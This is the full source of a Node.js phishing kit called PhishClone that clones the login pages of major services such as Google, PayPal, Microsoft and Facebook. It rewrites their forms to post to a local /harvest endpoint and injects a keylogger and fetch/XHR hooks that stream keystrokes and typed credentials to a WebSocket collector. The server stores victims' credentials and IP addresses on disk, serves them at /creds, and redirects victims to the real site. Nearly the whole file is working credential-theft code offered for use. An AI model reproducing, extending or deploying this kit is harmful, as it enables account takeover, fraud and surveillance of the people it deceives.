#!/usr/bin/env node
/**
 * phantom-arsenal / PhishClone v9.0
 * FULL OFFLINE SCRAPE:
 * 1. Chrome loads the page → CDP captures EVERY response body (CSS/JS/fonts/images)
 * 2. All assets saved as real files in ./site_cache/<hash>
 * 3. HTML rewritten to use local paths
 * 4. Local HTTP server serves EVERYTHING from disk — zero external requests
 */

import puppeteer        from 'puppeteer'
import net              from 'net'
import fs               from 'fs'
import path             from 'path'
import readline         from 'readline'
import { createServer } from 'http'
import { createHash }   from 'crypto'

// ── Chrome ────────────────────────────────────────────────────────────────────
function findChrome() {
  try {
    const base = '/root/.cache/puppeteer/chrome'
    for (const d of fs.readdirSync(base)) {
      const p = `${base}/${d}/chrome-linux64/chrome`
      if (fs.existsSync(p)) return p
    }
  } catch {}
  for (const c of ['/usr/bin/chromium','/usr/bin/chromium-browser','/usr/bin/google-chrome'])
    if (fs.existsSync(c)) return c
  return null
}
const CHROME = findChrome()
if (!CHROME) { console.error('❌ Chrome not found'); process.exit(1) }

// ── utils ─────────────────────────────────────────────────────────────────────
const CREDS_FILE  = 'captured_creds.json'
const LOG_FILE    = 'keystrokes.log'
const CACHE_DIR   = './site_cache'

function freePort(s) {
  return new Promise(r => {
    const sv = net.createServer()
    sv.listen(s, () => { const p = sv.address().port; sv.close(() => r(p)) })
    sv.on('error', () => freePort(s+1).then(r))
  })
}
function urlToFilename(url, ct) {
  const hash = createHash('md5').update(url).digest('hex').slice(0,10)
  const ext  = guessExt(url, ct)
  return hash + ext
}
function guessExt(url, ct='') {
  const u = url.split('?')[0].toLowerCase()
  if (u.endsWith('.css')  || ct.includes('css'))         return '.css'
  if (u.endsWith('.js')   || ct.includes('javascript'))  return '.js'
  if (u.endsWith('.svg')  || ct.includes('svg'))         return '.svg'
  if (u.endsWith('.png')  || ct.includes('png'))         return '.png'
  if (u.endsWith('.jpg')  || u.endsWith('.jpeg') || ct.includes('jpeg')) return '.jpg'
  if (u.endsWith('.gif')  || ct.includes('gif'))         return '.gif'
  if (u.endsWith('.webp') || ct.includes('webp'))        return '.webp'
  if (u.endsWith('.woff2')|| ct.includes('woff2'))       return '.woff2'
  if (u.endsWith('.woff') || ct.includes('woff'))        return '.woff'
  if (u.endsWith('.ttf')  || ct.includes('ttf'))         return '.ttf'
  if (u.endsWith('.ico')  || ct.includes('icon'))        return '.ico'
  if (u.endsWith('.json') || ct.includes('json'))        return '.json'
  if (ct.includes('image'))                              return '.img'
  if (ct.includes('font'))                               return '.font'
  return '.bin'
}
function ctForExt(ext) {
  const m = {
    '.css':'.css','.js':'application/javascript',
    '.svg':'image/svg+xml','.png':'image/png','.jpg':'image/jpeg',
    '.gif':'image/gif','.webp':'image/webp','.woff2':'font/woff2',
    '.woff':'font/woff','.ttf':'font/ttf','.ico':'image/x-icon',
    '.json':'application/json','.html':'text/html'
  }
  const full = {
    '.css':'text/css','.js':'application/javascript',
    '.svg':'image/svg+xml','.png':'image/png','.jpg':'image/jpeg',
    '.gif':'image/gif','.webp':'image/webp','.woff2':'font/woff2',
    '.woff':'font/woff','.ttf':'font/ttf','.ico':'image/x-icon',
    '.json':'application/json','.html':'text/html'
  }
  return full[ext] || 'application/octet-stream'
}
function log(m) { fs.appendFileSync(LOG_FILE, m+'\n') }
function saveCred(ip, data, target) {
  let a=[]; try{a=JSON.parse(fs.readFileSync(CREDS_FILE,'utf8'))}catch{}
  a.push({ time: new Date().toISOString(), ip, target, credentials: data })
  fs.writeFileSync(CREDS_FILE, JSON.stringify(a,null,2))
  console.log('\n\x1b[41m\x1b[97m [CAPTURED] IP='+ip+' → '+JSON.stringify(data)+' \x1b[0m\n')
}

// ── scrape ────────────────────────────────────────────────────────────────────
async function scrapeAndClone(targetUrl, wsPort) {
  if (!fs.existsSync(CACHE_DIR)) fs.mkdirSync(CACHE_DIR, { recursive: true })

  console.log('\n[*] Launching Chrome with CDP full capture...')

  const browser = await puppeteer.launch({
    headless: true,
    executablePath: CHROME,
    args: ['--no-sandbox','--disable-setuid-sandbox','--disable-dev-shm-usage','--disable-gpu']
  })

  const page   = await browser.newPage()
  const client = await page.createCDPSession()

  await page.setViewport({ width: 1280, height: 900 })
  await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0 Safari/537.36')
  await client.send('Network.enable')

  // url → local filename mapping
  const urlToFile = new Map()

  const SKIP = /google-analytics|googletagmanager|doubleclick|facebook\.net\/signals|connect\.facebook\.net|ads\.|analytics\./i

  // capture every response body via CDP
  client.on('Network.responseReceived', async ev => {
    const { requestId, response } = ev
    const { url, mimeType, headers } = response
    const ct = mimeType || (headers && headers['content-type']) || ''

    if (SKIP.test(url)) return
    if (url.startsWith('data:')) return

    // capture CSS, JS, fonts, images only
    const isAsset = /\.(css|js|woff2?|ttf|eot|otf|svg|png|jpe?g|gif|webp|ico|map)(\?|$)/i.test(url) ||
                    ct.includes('css') || ct.includes('javascript') ||
                    ct.includes('font') || ct.includes('image') || ct.includes('svg')
    if (!isAsset) return

    try {
      const { body, base64Encoded } = await client.send('Network.getResponseBody', { requestId })
      const buf = base64Encoded ? Buffer.from(body, 'base64') : Buffer.from(body, 'utf8')
      const filename = urlToFilename(url, ct)
      const filepath = path.join(CACHE_DIR, filename)
      fs.writeFileSync(filepath, buf)
      urlToFile.set(url, filename)
      process.stdout.write('\r[+] Cached: ' + urlToFile.size + ' files    ')
    } catch (_) {}
  })

  await page.goto(targetUrl, { waitUntil: 'networkidle2', timeout: 45000 })
  await new Promise(r => setTimeout(r, 3000))

  const finalUrl = page.url()
  let html = await page.content()
  await browser.close()
  console.log('\n[+] Rendered: ' + (html.length/1024).toFixed(1) + ' KB | Files saved: ' + urlToFile.size)

  // replace all remote URLs with /assets/filename
  let replaced = 0
  for (const [origUrl, filename] of urlToFile) {
    if (html.includes(origUrl)) {
      html = html.split(origUrl).join('/assets/' + filename)
      replaced++
    }
  }
  console.log('[+] Replaced ' + replaced + ' URLs → local paths')

  // remove any remaining absolute URLs for assets (fallback)
  // strip integrity checks that would block local files
  html = html.replace(/\s*integrity="[^"]*"/gi, '')
  html = html.replace(/\s*crossorigin="[^"]*"/gi, '')

  // patch forms
  html = html
    .replace(/(<form[^>]*)\s+action="[^"]*"/gi,  '$1 action="/harvest"')
    .replace(/(<form[^>]*)\s+action='[^']*'/gi,   "$1 action='/harvest'")
    .replace(/(<form)(?![^>]*action=)([^>]*>)/gi, '$1 action="/harvest"$2')
    .replace(/(<form[^>]*)\s+method="get"/gi,     '$1 method="POST"')

  const redirectUrl = finalUrl.replace(/\\/g, '\\\\').replace(/'/g, "\\'")

  // harvester + keylogger script
  const script = `<script>
(function(){
  var ws;
  function cws(){try{ws=new WebSocket('ws://'+location.hostname+':${wsPort}');ws.onclose=function(){setTimeout(cws,2000)};}catch(e){}}
  cws();
  function snd(t,d){if(ws&&ws.readyState===1)ws.send(JSON.stringify({type:t,data:d,ts:new Date().toISOString()}));}

  document.addEventListener('keyup',function(e){
    var t=e.target;
    snd('keystroke',{key:e.key,field:t.name||t.id||t.placeholder||t.type||'?',value:t.value});
  },true);

  document.addEventListener('submit',function(e){
    e.preventDefault();var f=e.target,d={};
    new FormData(f).forEach(function(v,k){d[k]=v;});
    snd('submit',d);
    fetch('/harvest',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(d)})
      .then(function(){window.location='${redirectUrl}';});
  },true);

  document.addEventListener('click',function(e){
    var el=e.target;
    if(el&&(el.type==='submit'||el.tagName==='BUTTON')){
      var inp=document.querySelectorAll('input'),d={};
      inp.forEach(function(i){if(i.value)d[i.name||i.id||i.type]=i.value;});
      if(Object.keys(d).length)snd('click_harvest',d);
    }
  },true);

  var oX=XMLHttpRequest.prototype.open,oS=XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype.open=function(m,u){this._u=u;return oX.apply(this,arguments);};
  XMLHttpRequest.prototype.send=function(b){
    if(b&&this._u&&/login|auth|session|signin/i.test(this._u))
      try{snd('xhr',{url:this._u,body:String(b)});}catch(e){}
    return oS.apply(this,arguments);
  };

  var oF=window.fetch;
  window.fetch=function(i,init){
    var u=typeof i==='string'?i:(i&&i.url)||'';
    if(/login|auth|session|signin/i.test(u)){
      var b=(init&&init.body)||'';try{snd('fetch_login',{url:u,body:String(b)});}catch(e){}
    }
    return oF.apply(this,arguments);
  };
})();
</script></body>`

  html = /<\/body>/i.test(html) ? html.replace(/<\/body>/i, script) : html + script

  // save final HTML to disk too
  fs.writeFileSync(path.join(CACHE_DIR, 'index.html'), html)
  console.log('[+] Saved to ' + CACHE_DIR + '/index.html')

  return { html, finalUrl, urlToFile }
}

// ── WebSocket (raw TCP stdlib) ────────────────────────────────────────────────
function startWS(port) {
  net.createServer(sock => {
    let shook=false, buf=Buffer.alloc(0)
    sock.on('data', chunk => {
      buf=Buffer.concat([buf,chunk])
      if (!shook) {
        const m=buf.toString().match(/Sec-WebSocket-Key: (.+)/)
        if (!m) return
        const acc=createHash('sha1').update(m[1].trim()+'258EAFA5-E914-47DA-95CA-C5AB0DC85B11').digest('base64')
        sock.write('HTTP/1.1 101 Switching Protocols\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Accept: '+acc+'\r\n\r\n')
        shook=true; buf=Buffer.alloc(0); return
      }
      if (buf.length<2) return
      const masked=(buf[1]&0x80)!==0
      let len=buf[1]&0x7F,off=2
      if(len===126){len=buf.readUInt16BE(2);off=4}
      if(buf.length<off+(masked?4:0)+len) return
      let pl
      if(masked){const mk=buf.slice(off,off+4);off+=4;pl=Buffer.from(buf.slice(off,off+len));for(let i=0;i<pl.length;i++)pl[i]^=mk[i%4];}
      else pl=buf.slice(off,off+len)
      buf=buf.slice(off+len)
      try{
        const d=JSON.parse(pl.toString()),t=d.type||''
        if(t==='keystroke'){
          const l='[KEY] field='+(d.data.field||'?')+'  key='+(d.data.key||'?')+'  val='+(d.data.value||'')
          console.log('\x1b[93m'+l+'\x1b[0m');log(l);
        } else if(['submit','click_harvest','xhr','fetch_login'].includes(t)){
          const l='['+t.toUpperCase()+'] '+JSON.stringify(d.data)
          console.log('\x1b[92m'+l+'\x1b[0m');log(l);
        }
      }catch{}
    })
    sock.on('error',()=>{})
  }).listen(port)
}

// ── menu ──────────────────────────────────────────────────────────────────────
const SITES = [
  {name:'Facebook',   url:'https://www.facebook.com/login'},
  {name:'Instagram',  url:'https://www.instagram.com/accounts/login/'},
  {name:'Google',     url:'https://accounts.google.com/signin'},
  {name:'Twitter/X',  url:'https://twitter.com/i/flow/login'},
  {name:'LinkedIn',   url:'https://www.linkedin.com/login'},
  {name:'Snapchat',   url:'https://accounts.snapchat.com/accounts/login'},
  {name:'TikTok',     url:'https://www.tiktok.com/login'},
  {name:'GitHub',     url:'https://github.com/login'},
  {name:'Microsoft',  url:'https://login.microsoftonline.com/'},
  {name:'PayPal',     url:'https://www.paypal.com/signin'},
  {name:'Netflix',    url:'https://www.netflix.com/login'},
  {name:'Steam',      url:'https://store.steampowered.com/login/'},
  {name:'Discord',    url:'https://discord.com/login'},
  {name:'Spotify',    url:'https://accounts.spotify.com/login'},
  {name:'Custom URL', url:null},
]

async function askTarget() {
  const rl=readline.createInterface({input:process.stdin,output:process.stdout})
  const ask=q=>new Promise(r=>rl.question(q,r))
  console.clear()
  console.log('\x1b[96m╔════════════════════════════════════════════════════╗')
  console.log('║   phantom-arsenal — PhishClone v9.0               ║')
  console.log('║   Full Offline Scrape • Serve 100% Locally        ║')
  console.log('╚════════════════════════════════════════════════════╝\x1b[0m\n')
  SITES.forEach((s,i)=>console.log('  \x1b[96m['+String(i+1).padStart(2)+'] \x1b[0m'+s.name))
  console.log('')
  let target=null
  while(!target){
    const c=await ask('\x1b[92m  Enter number: \x1b[0m')
    const idx=parseInt(c)-1
    if(idx>=0&&idx<SITES.length)
      target=SITES[idx].url===null?(await ask('\x1b[92m  Enter URL: \x1b[0m')).trim():SITES[idx].url
    else console.log('  \x1b[91mInvalid\x1b[0m')
  }
  rl.close(); return target
}

// ── main ──────────────────────────────────────────────────────────────────────
const targetUrl = process.argv[2] || await askTarget()
const PORT      = await freePort(parseInt(process.argv[3]||'8080'))
const WS_PORT   = await freePort(PORT+1)

const { html, finalUrl } = await scrapeAndClone(targetUrl, WS_PORT)
startWS(WS_PORT)

createServer((req, res) => {
  const p = decodeURIComponent(new URL(req.url, 'http://x').pathname)

  if (p === '/') {
    const b = Buffer.from(html, 'utf8')
    res.writeHead(200, { 'Content-Type':'text/html;charset=utf-8', 'Content-Length':b.length })
    res.end(b)

  } else if (p.startsWith('/assets/')) {
    const filename = p.slice(8)
    const filepath = path.join(CACHE_DIR, filename)
    if (fs.existsSync(filepath)) {
      const ext  = path.extname(filename)
      const ct   = ctForExt(ext)
      const data = fs.readFileSync(filepath)
      res.writeHead(200, {
        'Content-Type': ct,
        'Cache-Control': 'max-age=86400',
        'Access-Control-Allow-Origin': '*'
      })
      res.end(data)
    } else {
      res.writeHead(404); res.end()
    }

  } else if (p === '/creds') {
    let b='[]'; try{b=fs.readFileSync(CREDS_FILE,'utf8')}catch{}
    res.writeHead(200, {'Content-Type':'application/json'}); res.end(b)

  } else if (p === '/harvest' && req.method === 'POST') {
    let body=''
    req.on('data', c => body+=c)
    req.on('end', () => {
      let data; try{data=JSON.parse(body)}catch{data=Object.fromEntries(new URLSearchParams(body))}
      saveCred(req.socket.remoteAddress||'?', data, finalUrl)
      res.writeHead(200, {'Content-Type':'application/json'}); res.end('{"ok":true}')
    })

  } else { res.writeHead(404); res.end() }

}).listen(PORT, () => {
  console.log('\n[+] WebSocket  : ws://0.0.0.0:' + WS_PORT)
  console.log('[+] Phishing   : \x1b[92mhttp://0.0.0.0:' + PORT + '\x1b[0m')
  console.log('[+] Creds      : http://0.0.0.0:' + PORT + '/creds')
  console.log('[+] Cache dir  : ' + path.resolve(CACHE_DIR))
  console.log('\x1b[93m[*] Fully offline — zero external requests from victim\x1b[0m\n')
})

process.on('SIGINT', () => {
  console.log('\n\x1b[91m[!] Stopped\x1b[0m')
  try{
    const c=JSON.parse(fs.readFileSync(CREDS_FILE,'utf8'))
    console.log('[+] Captured: '+c.length)
    c.forEach(x=>console.log('  > '+x.time+' | IP='+x.ip+' | '+JSON.stringify(x.credentials)))
  }catch{}
  process.exit(0)
})
